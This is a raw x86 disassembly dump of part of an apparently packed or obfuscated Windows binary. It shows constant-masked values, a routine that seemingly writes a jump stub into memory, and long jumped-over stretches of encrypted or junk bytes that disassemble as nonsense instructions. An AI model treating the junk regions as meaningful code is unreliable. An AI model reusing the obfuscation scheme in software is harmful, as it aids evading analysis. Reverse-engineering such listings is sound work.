  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	sbb    DWORD PTR [eax+esi*8],edi
  415961:	xor    ebp,DWORD PTR [ebp+0x10]
  415964:	jg     0x4159de
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x41592f
  41596b:	ds mov ah,0x33
  41596e:	cs push 0x2a
  415971:	mov    ecx,0x715b1349
  415976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415977:	jmp    0x415931
  415979:	sbb    al,0x2e
  41597b:	dec    edi
  41597c:	pusha  
  41597d:	in     eax,dx
  41597e:	jecxz  0x415913
  415980:	cmp    esi,DWORD PTR [ebx]
  415982:	pusha  
  415983:	dec    ebx
  415984:	gs das 
  415986:	mov    ?,WORD PTR [esi-0x7]
  415989:	lock add BYTE PTR ds:0x2c3f62d9,cl
  415990:	fdivr  DWORD PTR [ebp-0x33]
  415993:	jns    0x415a04
  415995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415996:	int3   
  415997:	adc    esp,eax
  415999:	cli    
  41599a:	dec    ecx
  41599b:	retf   0x3d00
  41599e:	and    eax,0x8cda707e
  4159a3:	cwde   
  4159a4:	inc    ebx
  4159a5:	mov    esp,0x9f49cab3
  4159aa:	fisubr DWORD PTR [edi]
  4159ac:	aam    0x10
  4159ae:	sub    eax,0xe1116d80
  4159b3:	mov    BYTE PTR [ebx-0x8ee912f],ch
  4159b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159ba:	arpl   WORD PTR [ecx],bp
  4159bc:	popf   
  4159bd:	ret    
  4159be:	push   eax
  4159bf:	inc    edx
  4159c0:	pusha  
  4159c1:	or     al,ah
  4159c3:	dec    esi
  4159c4:	bound  edi,QWORD PTR [edi-0x52]
  4159c7:	(bad)  
  4159c8:	jl     0x415973
  4159ca:	add    al,0x23
  4159cc:	jbe    0x415989
  4159ce:	sbb    al,0xa6
  4159d0:	shl    DWORD PTR ds:0xaf977398,0x33
  4159d7:	xor    al,0xd5
  4159d9:	pop    eax
  4159da:	aad    0x68
  4159dc:	xor    eax,0xda7cbbf
  4159e1:	dec    eax
  4159e2:	mov    bh,0x2d
  4159e4:	out    0xb,al
  4159e6:	sti    
  4159e7:	popa   
  4159e8:	and    DWORD PTR gs:[esi-0x42],edi
  4159ec:	fucomip st,st(5)
  4159ee:	mov    ebp,0xd211bec5
  4159f3:	test   al,0x62
  4159f5:	pop    ds
  4159f6:	dec    esp
  4159f7:	clc    
  4159f8:	sub    bh,bh
  4159fa:	add    al,0x23
  4159fc:	js     0x415a2a
  4159fe:	mov    bh,0x88
  415a00:	ja     0x4159f2
  415a02:	dec    esp
  415a03:	push   eax
  415a04:	sub    bl,cl
  415a06:	test   DWORD PTR [ecx+0x64],ebp
  415a09:	jg     0x415a35
  415a0b:	icebp  
  415a0c:	mov    al,0x67
  415a0e:	cwde   
  415a0f:	(bad)  
  415a10:	mov    cl,0xfa
  415a12:	call   0x1161:0x62f54fb0
  415a19:	adc    BYTE PTR ds:0xf9968431,dl
  415a1f:	rcr    BYTE PTR [eax+0x6600882b],cl
  415a25:	or     al,0x9d
  415a27:	cmp    eax,0xffffffc3
  415a2a:	out    dx,al
  415a2b:	xchg   ebp,eax
  415a2c:	mov    edi,0xf633cdb
  415a31:	mov    al,0x52
  415a33:	cmp    DWORD PTR [ebx-0x60],ecx
  415a36:	mov    esi,0xd8966545
  415a3b:	daa    
  415a3c:	xor    DWORD PTR [bx+0x4f],ebp
  415a40:	(bad)  
  415a41:	mov    edi,0x52968320
  415a46:	push   ds
  415a47:	and    eax,0x765a1e68
  415a4c:	out    0x62,eax
  415a4e:	or     eax,0xb084e5f9
  415a53:	xchg   DWORD PTR [edi],edi
  415a55:	sbb    BYTE PTR [esi],cl
  415a57:	push   ds
  415a58:	sub    al,0x12
  415a5a:	icebp  
  415a5b:	ins    BYTE PTR es:[edi],dx
  415a5c:	add    al,0xc
  415a5e:	xchg   ecx,eax
  415a5f:	(bad)  
  415a60:	jmp    0x415a41
  415a62:	jg     0x415ac6
  415a64:	aam    0xbc
  415a66:	sub    al,0xeb
  415a68:	jno    0x415a23
  415a6a:	loopne 0x415a87
  415a6c:	aaa    
  415a6d:	sub    eax,0xe42c8f55
  415a72:	jle    0x415a0f
  415a74:	mov    ds:0x9ea001f7,eax
  415a79:	bnd call 0xedf95fb1
  415a7f:	and    dl,BYTE PTR [edi]
  415a81:	lods   eax,DWORD PTR ds:[esi]
  415a82:	add    ebp,DWORD PTR [edx+0x2382cfd2]
  415a88:	dec    edi
  415a89:	sub    al,0xa1
  415a8b:	or     cl,BYTE PTR [ebp+eax*4+0x36]
  415a8f:	fs sub al,0xb8
  415a92:	sub    esp,DWORD PTR [ebp+0x16acb9a6]
  415a98:	jne    0x415aa7
  415a9a:	xchg   ecx,eax
  415a9b:	xor    eax,0xc68dfb1b
  415aa0:	rcr    dh,cl
  415aa2:	jg     0x415a90
  415aa4:	arpl   WORD PTR [edx+0x32],ax
  415aa7:	sbb    esp,edx
  415aa9:	dec    eax
  415aaa:	popf   
  415aab:	inc    edi
  415aac:	xor    al,0x76
  415aae:	call   0x1721a2be
  415ab3:	mov    dl,0x9b
  415ab5:	push   0xffffffea
  415ab7:	mov    ds:0xb6b98f75,al
  415abc:	mov    ecx,cs
  415abe:	(bad)  
  415abf:	es (bad) 
  415ac2:	xor    BYTE PTR [esi],dh
  415ac4:	mov    eax,ds:0xe4961644
  415ac9:	or     eax,0x9b22b1d6
  415ace:	xor    eax,0x20a059d3
  415ad3:	and    DWORD PTR [ecx-0xe0af719],ebx
  415ad9:	push   DWORD PTR [ebx]
  415adb:	or     DWORD PTR es:[ecx+ebp*4],edx
  415adf:	xchg   edx,eax
  415ae0:	adc    ch,BYTE PTR [edi]
  415ae2:	cld    
  415ae3:	popf   
  415ae4:	or     BYTE PTR [ecx-0x18],0x3
  415ae8:	push   edx
  415ae9:	or     al,BYTE PTR [eax+0x3c7b479e]
  415aef:	ss aas 
  415af1:	jle    0x415abd
  415af3:	xchg   ecx,eax
  415af4:	fmul   QWORD PTR [esi-0x4f]
  415af7:	adc    bh,bh
  415af9:	mov    ebx,0x18fbc0f1
  415afe:	mov    ecx,0xd59a7b0e
  415b03:	adc    DWORD PTR [ebx+0x12],edx
  415b06:	jmp    0x22f981eb
  415b0b:	call   0x6229043f
  415b10:	add    esi,edi
  415b12:	out    0xca,eax
  415b14:	jmp    0x415aef
  415b16:	test   BYTE PTR [ebx+ecx*1],dl
  415b19:	outs   dx,DWORD PTR fs:[esi]
  415b1b:	and    al,0x65
  415b1d:	pop    ecx
  415b1e:	cli    
  415b1f:	push   esi
  415b20:	xchg   ebp,eax
  415b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b22:	shl    DWORD PTR [edi],1
  415b24:	fcomp  DWORD PTR [ebp-0x3a]
  415b27:	jp     0x415b10
  415b29:	cmc    
  415b2a:	aam    0x1f
  415b2c:	sub    DWORD PTR [ecx+0x30],edx
  415b2f:	std    
  415b30:	inc    edi
  415b31:	sub    al,0x81
  415b33:	jecxz  0x415ab9
  415b35:	mov    ds:0x3ed7c2fe,eax
  415b3a:	(bad)  
  415b3b:	cmp    eax,0xd7e5e998
  415b40:	repz cmp DWORD PTR [ebx],edi
  415b43:	in     eax,0x2
  415b45:	in     al,dx
  415b46:	sar    dx,1
  415b49:	lahf   
  415b4a:	mov    ah,0xc
  415b4c:	xchg   edx,eax
  415b4d:	loopne 0x415b66
  415b4f:	stos   BYTE PTR es:[edi],al
  415b50:	lods   eax,DWORD PTR ds:[esi]
  415b51:	mov    bl,BYTE PTR [edi+edx*4-0x18]
  415b55:	push   edx
  415b56:	fs hlt 
  415b58:	aas    
  415b59:	ret    
  415b5a:	scas   eax,DWORD PTR es:[edi]
  415b5b:	fild   QWORD PTR [esi-0x43]
  415b5e:	add    al,0x1b
  415b60:	call   0x8f7a0a29
  415b65:	arpl   WORD PTR [esi+0x5913845f],sp
  415b6b:	sbb    esi,esp
  415b6d:	rol    DWORD PTR [esi],0x3a
  415b70:	shl    BYTE PTR [eax+0x44247a20],cl
  415b76:	repz push edx
  415b78:	(bad)  
  415b79:	or     eax,0x3498d48e
  415b7e:	sub    eax,0x49cfdfae
  415b83:	pop    edi
  415b84:	cmc    
  415b85:	xchg   edx,eax
  415b86:	retf   0xa9da
  415b89:	mov    eax,ds:0xa3f2b7f8
  415b8e:	fwait
  415b8f:	xchg   BYTE PTR [edx],dh
  415b91:	test   BYTE PTR [edx-0x69cd5477],dh
  415b97:	adc    DWORD PTR [esi],edx
  415b99:	test   BYTE PTR [edx-0x7fe9894b],ch
  415b9f:	jne    0x415c16
  415ba1:	aaa    
  415ba2:	pushf  
  415ba3:	push   edi
  415ba4:	bound  esp,QWORD PTR [esi]
  415ba6:	xchg   edx,eax
  415ba7:	xlat   BYTE PTR ds:[ebx]
  415ba8:	ss push 0x5097ed63
  415bae:	out    0xc3,al
  415bb0:	sub    DWORD PTR ds:0x9e56f207,esi
  415bb6:	jmp    0xdd9a637c
  415bbb:	popf   
  415bbc:	cdq    
  415bbd:	jp     0x415b52
  415bbf:	push   0xffffffd1
  415bc1:	dec    ebx
  415bc2:	push   ebp
  415bc3:	pop    ebx
  415bc4:	adc    dh,BYTE PTR [edi-0x21]
  415bc7:	hlt    
  415bc8:	inc    esi
  415bc9:	scas   eax,DWORD PTR es:[edi]
  415bca:	sub    DWORD PTR [esi+eiz*2+0x2c36c03f],edx
  415bd1:	out    dx,eax
  415bd2:	push   eax
  415bd3:	inc    ebp
  415bd4:	pop    ebx
  415bd5:	mov    ah,0x56
  415bd7:	mov    dh,0x48
  415bd9:	arpl   WORD PTR [edi+0x4a2fabb6],cx
  415bdf:	pop    ss
  415be0:	inc    esp
  415be1:	cli    
  415be2:	add    bl,bl
  415be4:	or     al,0x1
  415be6:	push   eax
  415be7:	je     0x415bd2
  415be9:	pusha  
  415bea:	mov    al,ds:0x906dec2b
  415bef:	jp     0x415c45
  415bf1:	inc    edx
  415bf2:	xor    DWORD PTR [ecx],eax
  415bf4:	pop    ecx
  415bf5:	mov    bl,BYTE PTR [ecx-0x189b2e83]
  415bfb:	test   eax,0x2ab2ee04
  415c00:	sbb    eax,0x9c2127bb
  415c05:	push   ecx
  415c06:	push   ecx
  415c07:	mov    DWORD PTR ds:0x42a7f5,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	xchg   ecx,eax
  415c40:	or     eax,0x158ad73b
  415c45:	jg     0x415cbf
  415c47:	xchg   ebp,eax
  415c48:	jle    0x415cc2
  415c4a:	js     0x415c91
  415c4c:	mov    eax,0xf56ce063
  415c51:	mov    ebp,0xc7771657
  415c56:	in     eax,0x34
  415c58:	dec    ebp
  415c59:	adc    ah,BYTE PTR [esi+0x584af9c4]
  415c5f:	int    0xfe
  415c61:	aas    
  415c62:	imul   esp,DWORD PTR [edi],0xffffffc2
  415c65:	sub    dh,dl
  415c67:	loopne 0x415c73
  415c69:	jne    0x415c9f
  415c6b:	mov    ebp,0x1206b8c8
  415c70:	fcomp  QWORD PTR [ebx]
  415c72:	add    ch,cl
  415c74:	arpl   WORD PTR [eax],bp
  415c76:	cld    
  415c77:	pop    esp
  415c78:	icebp  
  415c79:	jmp    0x5d2ecb8
  415c7e:	cmp    eax,0x30d20631
  415c83:	cmp    dh,BYTE PTR [esi-0x70]
  415c86:	pop    es
  415c87:	ret    0x1679
  415c8a:	xor    al,0x7c
  415c8c:	xchg   ebx,eax
  415c8d:	inc    edx
  415c8e:	dec    esp
  415c8f:	mov    dl,0x9b
  415c91:	jb     0x415c8f
  415c93:	enter  0xf95b,0xd4
  415c97:	mov    eax,0xa369d411
  415c9c:	pop    ecx
  415c9d:	mov    esi,0x1e4923fa
  415ca2:	xchg   edx,eax
  415ca3:	and    DWORD PTR [ecx],eax
  415ca5:	daa    
  415ca6:	push   ecx
  415ca7:	fcom   DWORD PTR [ebx-0x19]
  415caa:	inc    ebx
  415cab:	das    
  415cac:	jns    0x415c37
  415cae:	fst    QWORD PTR [ebx+0x2b1c7119]
  415cb4:	cwde   
  415cb5:	jb     0x415c81
  415cb7:	cmc    
  415cb8:	xchg   ebp,eax
  415cb9:	adc    al,0xa2
  415cbb:	ja     0x415d0b
  415cbd:	push   ss
  415cbe:	dec    edx
  415cbf:	fmul   DWORD PTR [eax+0x612dfea3]
  415cc5:	sti    
  415cc6:	in     al,dx
  415cc7:	inc    edi
  415cc8:	test   DWORD PTR [eax],ebp
  415cca:	scas   al,BYTE PTR es:[edi]
  415ccb:	adc    ebp,DWORD PTR [ebx+0x6b1e4583]
  415cd1:	repz (bad) 
  415cd3:	sahf   
  415cd4:	add    eax,0x3cb8df49
  415cd9:	pop    edx
  415cda:	sub    al,0xe
  415cdc:	xchg   BYTE PTR [ecx+edx*1+0x4f896f16],ah
  415ce3:	ins    DWORD PTR es:[edi],dx
  415ce4:	xchg   edi,eax
  415ce5:	xlat   BYTE PTR ds:[ebx]
  415ce6:	addr16 jnp 0x415c94
  415ce9:	add    eax,0xe887e056
  415cee:	cld    
  415cef:	div    WORD PTR [edi-0x6b]
  415cf3:	test   BYTE PTR [ecx-0x9720f36],dh
  415cf9:	or     ecx,DWORD PTR [ebp-0x29]
  415cfc:	push   edx
  415cfd:	iret   
  415cfe:	pop    eax
  415cff:	add    esp,esp
  415d01:	mov    ah,0x6e
  415d03:	in     eax,dx
  415d04:	lahf   
  415d05:	pop    eax
  415d06:	out    dx,al
  415d07:	(bad)  
  415d08:	jne    0x415d52
  415d0a:	(bad)  
  415d0b:	(bad)  
  415d0c:	add    eax,eax
  415d0e:	arpl   WORD PTR [ebx+eiz*2-0x1e],dx
  415d12:	mov    bh,0x7c
  415d14:	es loope 0x415d56
  415d17:	mov    ?,WORD PTR [edx]
  415d19:	outs   dx,BYTE PTR ds:[esi]
  415d1a:	lods   al,BYTE PTR ds:[esi]
  415d1b:	rcl    BYTE PTR [ebp+0x264105c4],cl
  415d21:	mov    al,0xe4
  415d23:	pusha  
  415d24:	jno    0x415d32
  415d26:	sub    BYTE PTR ds:0x2fa49525,bl
  415d2c:	adc    esp,DWORD PTR [ebx+ebx*8+0x51]
  415d30:	xchg   ebp,eax
  415d31:	and    al,0x78
  415d33:	cmp    edi,ecx
  415d35:	fsubrp st(7),st
  415d37:	mov    eax,0xdad7fe01
  415d3c:	(bad)  
  415d3d:	enter  0x248d,0x2e
  415d41:	in     al,dx
  415d42:	dec    ecx
  415d43:	(bad)  [eax+0x63]
  415d46:	bound  edi,QWORD PTR ds:0xbb33f8e6
  415d4c:	add    al,0x68
  415d4e:	adc    DWORD PTR [ebx],edx
  415d50:	fdivrp st(0),st
  415d52:	shl    DWORD PTR [edi+0x1a],0x8a
  415d56:	scas   eax,DWORD PTR es:[edi]
  415d57:	pushf  
  415d58:	psubusw mm6,QWORD PTR [edi+0x7b]
  415d5c:	lock mov ds:0x6b697684,al
  415d62:	mov    ds:0x23b12159,al
  415d67:	pop    esp
  415d68:	scas   eax,DWORD PTR es:[edi]
  415d69:	xor    al,0x2f
  415d6b:	pop    esp
  415d6c:	dec    ecx
  415d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d6e:	mov    cl,0x72
  415d70:	mov    bh,0x4
  415d72:	cmp    DWORD PTR [edx-0x16],edx
  415d75:	adc    dh,al
  415d77:	jb     0x415d1a
  415d79:	mov    DWORD PTR [ecx-0x36f4842e],ecx
  415d7f:	push   edi
  415d80:	jge    0x415d0a
  415d82:	mov    dh,0x1e
  415d84:	ins    DWORD PTR es:[edi],dx
  415d85:	inc    ecx
  415d86:	aaa    
  415d87:	jb     0x415dfa
  415d89:	jbe    0x415dd5
  415d8b:	xchg   edi,eax
  415d8c:	add    dl,BYTE PTR [eax-0x59769236]
  415d92:	enter  0x9ec6,0x99
  415d96:	out    dx,eax
  415d97:	les    esi,FWORD PTR [eax-0x2c]
  415d9a:	inc    ebx
  415d9b:	inc    ebx
  415d9c:	mov    DWORD PTR [edi+0x4bc4f183],ebx
  415da2:	sub    al,0xa5
  415da4:	cmp    ah,bl
  415da6:	pop    edx
  415da7:	popf   
  415da8:	jmp    0x3eae:0xb4d2138
  415daf:	ja     0x415dc7
  415db1:	pop    ds
  415db2:	jle    0x415dfb
  415db4:	pop    esp
  415db5:	fs push edi
  415db7:	sbb    ebp,ebx
  415db9:	mov    ebx,0x8f26e222
  415dbe:	push   esp
  415dbf:	inc    BYTE PTR [ebx-0x7ee73d39]
  415dc5:	aad    0x7a
  415dc7:	jmp    0xbe713f5
  415dcc:	aam    0x9c
  415dce:	cmp    si,cx
  415dd1:	cmc    
  415dd2:	mov    al,ds:0x192903b2
  415dd7:	mov    fs,WORD PTR [ebx+edi*1]
  415dda:	pop    ss
  415ddb:	mov    BYTE PTR [eax+0x7c],dh
  415dde:	cli    
  415ddf:	fwait
  415de0:	out    dx,eax
  415de1:	adc    DWORD PTR [esi],edi
  415de3:	(bad)  
  415de4:	pop    ebp
  415de5:	jbe    0x415d7b
  415de7:	mov    BYTE PTR [esp+esi*8-0x87e8c1d],al
  415dee:	cmp    al,0xfe
  415df0:	xor    eax,0xb2a2ea5e
  415df5:	mov    ebx,0xb2ec693b
  415dfa:	(bad)  
  415dfb:	or     BYTE PTR [edi-0x34],al
  415dfe:	es pop esi
  415e00:	xchg   edi,eax
  415e01:	xor    BYTE PTR [esi-0x240cab02],dh
  415e07:	and    BYTE PTR [edx],dh
  415e09:	push   edi
  415e0a:	sahf   
  415e0b:	add    ch,al
  415e0d:	in     al,0x7b
  415e0f:	xor    BYTE PTR [edi+0x5f],0xa5
  415e13:	int3   
  415e14:	and    ch,BYTE PTR [ebx]
  415e16:	jnp    0x415e97
  415e18:	cmp    DWORD PTR [edx-0x571228f5],eax
  415e1e:	adc    al,0xf9
  415e20:	jae    0x415dba
  415e22:	push   ebx
  415e23:	mov    esi,0x54e095fb
  415e28:	not    DWORD PTR ds:0x670ed94c
  415e2e:	mov    edx,0xdf12549c
  415e33:	xor    al,0x4a
  415e35:	lea    esi,ss:[edi]
  415e38:	js     0x415e8f
  415e3a:	jmp    0x4dc3:0xcb41327b
  415e41:	js     0x415e0c
  415e43:	fsub   st,st(4)
  415e45:	xchg   esp,eax
  415e46:	jecxz  0x415e45
  415e48:	push   edx
  415e49:	mov    ebx,0x1060738f
  415e4e:	ins    DWORD PTR es:[edi],dx
  415e4f:	add    eax,0x1dff737d
  415e54:	xchg   di,ax
  415e56:	add    eax,ecx
  415e58:	aad    0x8d
  415e5a:	dec    esp
  415e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e5c:	cli    
  415e5d:	shr    DWORD PTR [edi-0x78],cl
  415e60:	mov    ebx,0x4d92c495
  415e65:	out    0x89,eax
  415e67:	sbb    ch,BYTE PTR [esp+ebp*1]
  415e6a:	mov    WORD PTR [eax-0x33],?
  415e6d:	push   edi
  415e6e:	repnz add BYTE PTR [edx+edx*2+0x7aacf3ae],bl
  415e76:	mov    edx,0x7478f3a7
  415e7b:	(bad)  
  415e7c:	loope  0x415eba
  415e7e:	sub    bl,BYTE PTR [ebx+0x51]
  415e81:	sub    eax,0x4f98af65
  415e86:	ret    
  415e87:	jmp    0x698e9af
  415e8c:	mov    dl,0xa6
  415e8e:	xchg   ecx,eax
  415e8f:	jnp    0x415e8e
  415e91:	(bad)  
  415e92:	xor    al,0x28
  415e94:	mov    eax,0x91c499cb
  415e99:	xor    al,0x36
  415e9b:	fistp  QWORD PTR [eax+0x6f7153b7]
  415ea1:	push   ss
  415ea2:	add    BYTE PTR [ebx+eiz*8-0x63a6e1b8],bl
  415ea9:	push   0x42d3b0f4
  415eae:	es xchg ebp,ecx
  415eb1:	clc    
  415eb2:	faddp  st(0),st
  415eb4:	std    
  415eb5:	dec    edi
  415eb6:	clc    
  415eb7:	cmp    dh,BYTE PTR [edx+0xb]
  415eba:	push   ss
  415ebb:	push   edx
  415ebc:	dec    esp
  415ebd:	adc    esi,ecx
  415ebf:	mov    ds:0x521fa9e3,eax
  415ec4:	mov    dl,BYTE PTR [edx-0x771604fb]
  415eca:	fiadd  DWORD PTR [ebx]
  415ecc:	and    eax,0x89b7d673
  415ed1:	pop    edx
  415ed2:	mov    bh,0x0
  415ed4:	clc    
  415ed5:	dec    esp
  415ed6:	(bad)  
  415ed7:	(bad)  [ebp-0x51]
  415eda:	jb     0x415ec0
  415edc:	jo     0x415f18
  415ede:	cmp    BYTE PTR [eax-0x31],0xce
  415ee2:	stos   DWORD PTR es:[edi],eax
  415ee3:	imul   DWORD PTR [edi+edx*1]
  415ee6:	mov    DWORD PTR [ebp-0x8],eax
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	mov    ah,0xe8
  415f4c:	les    edi,FWORD PTR [edx+0x787f1a27]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415eee
  415f57:	out    0x8,al
  415f59:	in     al,dx
